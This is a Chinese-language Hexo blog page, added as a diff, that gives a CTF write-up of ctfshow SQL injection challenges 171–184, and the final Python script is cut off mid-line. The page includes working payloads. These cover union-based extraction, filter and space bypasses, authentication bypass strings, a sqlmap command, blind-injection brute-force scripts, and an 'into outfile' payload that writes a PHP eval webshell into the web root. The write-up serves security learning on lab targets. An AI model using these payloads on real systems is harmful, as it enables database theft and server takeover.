@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="sql注入有三个表特别注意： 一个是information—schema系统表里面有三个表特别注意 一个表：schemata 存放者所有的数据库的表  一个表：tables 存放着所有表的表 里面又有两个字段：table_schema表属于那个库 ​                                   table_name         表名  最后一个表：columns   存">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql注入有三个表特别注意： 一个是information—schema系统表里面有三个表特别注意 一个表：schemata 存放者所有的数据库的表  一个表：tables 存放着所有表的表 里面又有两个字段：table_schema表属于那个库 ​                                   table_name         表名  最后一个表：columns   存">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220314194143795.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220314195327642.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220314235821228.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315000021396.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315000952891.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315001137577.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315002902961.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315003636156.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315005039252.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315005419653.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315150401272.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315155102093.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315160816366.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315230527000.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315233828390.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315234123445.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315234533447.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316123934079.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316124911216.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316125548713.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316134602308.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316134849915.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316135150444.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316135757579.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316140650709.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220317103334111.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220317132816335.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220317133327427.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220412174002576.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTUxNTk4,size_16,color_FFFFFF,t_70.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTUxNTk4,size_16,color_FFFFFF,t_70-16497567828961.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTUxNTk4,size_16,color_FFFFFF,t_70-16497567828972.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTUxNTk4,size_16,color_FFFFFF,t_70-16497567828973.png">
+<meta property="og:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220419182818356.png">
+<meta property="article:published_time" content="2022-03-14T15:54:06.000Z">
+<meta property="article:modified_time" content="2022-07-12T15:24:58.899Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220314194143795.png">
+
+<link rel="canonical" href="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SQL注入 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-14 23:54:06" itemprop="dateCreated datePublished" datetime="2022-03-14T23:54:06+08:00">2022-03-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-12 23:24:58" itemprop="dateModified" datetime="2022-07-12T23:24:58+08:00">2022-07-12</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>有三个表特别注意：</p>
+<p>一个是information—schema系统表里面有三个表特别注意</p>
+<p>一个表：schemata 存放者所有的数据库的表</p>
+<hr>
+<p>一个表：tables 存放着所有表的表</p>
+<p>里面又有两个字段：table_schema表属于那个库</p>
+<p>​                                   table_name         表名</p>
+<hr>
+<p>最后一个表：columns   存放着所有字段的表</p>
+<p>里面有三个字段：table_schema</p>
+<p>​                               table_name</p>
+<p>​                                column_name</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220314194143795.png" class="" title="image-20220314194143795">
+
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220314195327642.png" class="" title="image-20220314195327642">
+
+<p><strong>通常来说没有过滤的字符正常报错</strong></p>
+<p><strong>过滤的话会显示没有数据</strong></p>
+<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%23</span><br><span class="line">-- SDAaf     横横加空格为了避免空格没有执行可以在后面加字母</span><br><span class="line">--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="空格代替"><a href="#空格代替" class="headerlink" title="空格代替"></a>空格代替</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/，%0d %0a %0c %0b %a0 %09  括号也可以</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="web-171-联合注入"><a href="#web-171-联合注入" class="headerlink" title="web 171  联合注入"></a>web 171  联合注入</h3><p>第一步：确定数据库名</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220314235821228.png" class="" title="image-20220314235821228">
+
+<p>第二步：根据数据库名  确定表名</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315000021396.png" class="" title="image-20220315000021396">
+
+<p>第三步：根据表名 查询字段名</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315000952891.png" class="" title="image-20220315000952891">
+
+<p>最后直接利用得到的字段名结合表名的结果</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315001137577.png" class="" title="image-20220315001137577">
+
+<h3 id="172-对返回结果有限制"><a href="#172-对返回结果有限制" class="headerlink" title="172   对返回结果有限制"></a>172   对返回结果有限制</h3><img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315002902961.png" class="" title="image-20220315002902961">
+
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315003636156.png" class="" title="image-20220315003636156">
+
+<h3 id="173-可以对返回的结果进行base64编码-绕过正则"><a href="#173-可以对返回的结果进行base64编码-绕过正则" class="headerlink" title="173  可以对返回的结果进行base64编码 绕过正则"></a>173  可以对返回的结果进行base64编码 绕过正则</h3><img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315005039252.png" class="" title="image-20220315005039252">
+
+
+
+<p>==可以对返回结果进行编码 to_base64(password)     或者可以利用reverse（）函数将字符串倒置==</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315005419653.png" class="" title="image-20220315005419653">
+
+<h3 id="174-用到了replace-和reverse-函数"><a href="#174-用到了replace-和reverse-函数" class="headerlink" title="174  用到了replace   和reverse 函数"></a>174  用到了replace   和reverse 函数</h3><img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315150401272.png" class="" title="image-20220315150401272">
+
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315155102093.png" class="" title="image-20220315155102093">
+
+<p>plaoad：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select reverse(username),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#x27;1&#x27;,&#x27;a&#x27;),&#x27;2&#x27;,&#x27;b&#x27;),&#x27;3&#x27;,&#x27;c&#x27;),&#x27;4&#x27;,&#x27;d&#x27;),&#x27;5&#x27;,&#x27;e&#x27;),&#x27;6&#x27;,&#x27;f&#x27;),&#x27;7&#x27;,&#x27;g&#x27;),&#x27;8&#x27;,&#x27;h&#x27;),&#x27;9&#x27;,&#x27;i&#x27;),&#x27;0&#x27;,&#x27;j&#x27;) from ctfshow_user4 where username=&#x27;flag&#x27;  --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="web-175-这里过滤了ASCII表，利用到into-outfile函数"><a href="#web-175-这里过滤了ASCII表，利用到into-outfile函数" class="headerlink" title="web 175    这里过滤了ASCII表，利用到into outfile函数"></a>web 175    这里过滤了ASCII表，利用到into outfile函数</h3><p>==<strong>[x00-x7f] 匹配ASCII值从0-127的字符</strong>==</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315160816366.png" class="" title="image-20220315160816366">
+
+<p>into  outfile 函数 </p>
+<p>select  into  outfield  功能：</p>
+<p>将查询结果导入到pc的指定目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * into outfile  指定目录</span><br><span class="line">1&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;/var/www/html/2.txt&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>方法一</p>
+<p>至于为什么是两个字段  可以一个加一个的史</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315230527000.png" class="" title="image-20220315230527000">
+
+<p>方法二</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,&quot;&lt;?php eval($_POST[1])?&gt;&quot; into outfile &#x27;/var/www/html/1.php&#x27; --+</span><br><span class="line">写入一句话木马  将木马先进行base64编码在进行URL编码 </span><br><span class="line"></span><br><span class="line">1&#x27; union select 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;) into outfile &#x27;/var/www/html/1.php&#x27; --</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315233828390.png" class="" title="image-20220315233828390">
+
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315234123445.png" class="" title="image-20220315234123445">
+
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220315234533447.png" class="" title="image-20220315234533447">
+
+<h3 id="176-开始有过滤——大小写过滤"><a href="#176-开始有过滤——大小写过滤" class="headerlink" title="176 开始有过滤——大小写过滤"></a>176 开始有过滤——大小写过滤</h3><img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316123934079.png" class="" title="image-20220316123934079">
+
+<p>进行常规操作就可以了</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316124911216.png" class="" title="image-20220316124911216">
+
+<p>骚操作</p>
+<p>直接利用万能密码 利用 or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1--+</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316125548713.png" class="" title="image-20220316125548713">
+
+<h3 id="177-空格绕过-09-0A-0D-都可以替代空格"><a href="#177-空格绕过-09-0A-0D-都可以替代空格" class="headerlink" title="177 空格绕过            %09 %0A %0D +都可以替代空格"></a>177 空格绕过            %09 %0A %0D +都可以替代空格</h3><p>过滤了空格。</p>
+<p>先尝试 1’and’a’=’a</p>
+<p>发现执行成功。 再尝试1’ and ‘a’=’a</p>
+<p>注意这里：后面只有一个单引号是为了闭合后面的单引号   用数字的话得用括号（1=1）</p>
+<p>第一种方法：万能钥匙</p>
+<p>因为知道了过滤了什么直接构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or&#x27;a&#x27;=&#x27;a&#x27;%23</span><br><span class="line">1&#x27;or(1=1)%23</span><br></pre></td></tr></table></figure>
+
+<p>第二种常规，用%09 %0A %0D +都可以替代空格，用%23代替注释</p>
+<p>%09 %0A %0D +都可以替代空格</p>
+<p>我草截屏不见了，构造就好</p>
+<h3 id="178"><a href="#178" class="headerlink" title="178"></a>178</h3><p>按照上题的方法发现过滤了空格 和+  不影响万能钥匙</p>
+<p>方法一直接万能钥匙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(1=1)%23</span><br></pre></td></tr></table></figure>
+
+
+
+<p>第二种方法</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316134602308.png" class="" title="image-20220316134602308">
+
+<p>看答案说是过滤了</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316134849915.png" class="" title="image-20220316134849915">
+
+<h3 id="179"><a href="#179" class="headerlink" title="179"></a>179</h3><p>盲猜万能密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(1=1)%23</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316135150444.png" class="" title="image-20220316135150444">
+
+<p>第二种方法</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316135757579.png" class="" title="image-20220316135757579">
+
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220316140650709.png" class="" title="image-20220316140650709">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用空格的1&#x27;union(select(1),(2),(password)from(ctfshow_user)where(username=&#x27;flag&#x27;))%23</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="180"><a href="#180" class="headerlink" title="180"></a>180</h3><img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220317103334111.png" class="" title="image-20220317103334111">
+
+<p>可能是我输错了，看了答案才知道–%0c没有被过滤所以用–%0c-注释就行了</p>
+<p>解法上面都可</p>
+<h3 id="181-这题有借鉴意义"><a href="#181-这题有借鉴意义" class="headerlink" title="181   这题有借鉴意义"></a>181   这题有借鉴意义</h3><p>有过滤的字符型注入，这次给出了过滤的函数 waf。</p>
+<p>//对传入的参数进行了过滤<br>function waf($str){<br>    return preg_match(‘/ |*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|#|file|into|select/i’, $str);<br>}</p>
+<p>可知没有空格和 select 可以用，这里利用逻辑运算的优先级构造 and 语句，绕过查询语句前面的 username != flag，且不能含有空格。<br>由前几题或爆破可得，flag 所在记录的 id 列的值为 26，故构造<br>payload: 0’or(id=26)and’1<br><strong>and 的优先级比 or 要高，故注入后的语句变成了</strong><br>select id,username,password from ctfshow_user where username != ‘flag’ and id = ‘0’or(id=26)and’1’ limit 1;<br>前面满足条件 id=0 的记录不存在，故该语句可简化为<br>select id,username,password from ctfshow_user where (0) or(id=26)and’1’ limit 1;</p>
+<p>先计算 and，再计算 or，最后得到满足 id=26 的记录，即 flag。</p>
+<p>或者利用万能密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(1=1)--%0c-   </span><br></pre></td></tr></table></figure>
+
+<h3 id="182-跟181一样"><a href="#182-跟181一样" class="headerlink" title="182 跟181一样"></a>182 跟181一样</h3><p>方法一：</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220317132816335.png" class="" title="image-20220317132816335">
+
+<p>方法2</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220317133327427.png" class="" title="image-20220317133327427">
+
+
+
+<p>sqlmap.py -u “<a target="_blank" rel="noopener" href="http://8c5d120f-53c0-4eb0-9604-b1210b785928.challenge.ctf.show/sqlmap.php/api/?id=1&quot;">http://8c5d120f-53c0-4eb0-9604-b1210b785928.challenge.ctf.show/sqlmap.php/api/?id=1&quot;</a> –referer=”ctf.show”</p>
+<h3 id="183-补充sql正则匹配-新的姿势"><a href="#183-补充sql正则匹配-新的姿势" class="headerlink" title="183 ==补充sql正则匹配== 新的姿势"></a>183 ==补充sql正则匹配== 新的姿势</h3><p>正则匹配语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;列名&gt; regexp &#x27;正则表达式&#x27;</span><br><span class="line"></span><br><span class="line">例子</span><br><span class="line">select * from table where name regexp &#x27;^2018&#x27;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220412174002576.png" class="" title="image-20220412174002576">
+
+<h4 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h4><p>通过利用正则匹配来判断，字段的值有没有对于的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://6087ac58-622d-4646-a0c7-69a99cbf7b35.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flagstr = <span class="string">r&quot;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&quot;(ctfshow_user)where(substr(pass,<span class="subst">&#123;i&#125;</span>,1))regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">————————————————</span><br><span class="line">https://blog.csdn.net/qq_45951598/article/details/<span class="number">114374307</span></span><br></pre></td></tr></table></figure>
+
+<p>分析：就是通过判断passwd（中的第一个字符，是不是1，返回为0的话，在试下一个，知道返回1时我们就知道第一个字符是什么，以此类推）</p>
+<p>这里我简单样式一下 (ctfshow_user)where(substr(pass,{i},1))regexp(’{j}’) 这个的意思。</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTUxNTk4,size_16,color_FFFFFF,t_70.png" class="" title="在这里插入图片描述">
+<p>当我在查询file表code字段的第一个字符是一，有回显</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTUxNTk4,size_16,color_FFFFFF,t_70-16497567828961.png" class="" title="在这里插入图片描述">
+<p>0没有回显</p>
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTUxNTk4,size_16,color_FFFFFF,t_70-16497567828972.png" class="" title="在这里插入图片描述">
+<img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTUxNTk4,size_16,color_FFFFFF,t_70-16497567828973.png" class="" title="在这里插入图片描述">
+<p>然后通过爆破的方式一个一个试出来，大概就是这么个意思。</p>
+<h4 id="184"><a href="#184" class="headerlink" title="184"></a>184</h4><img src="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/image-20220419182818356.png" class="" title="image-20220419182818356">
+
+
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">脚本</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3d1238b8-57bd-43c9-b3c3-415cb2fc5135.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span 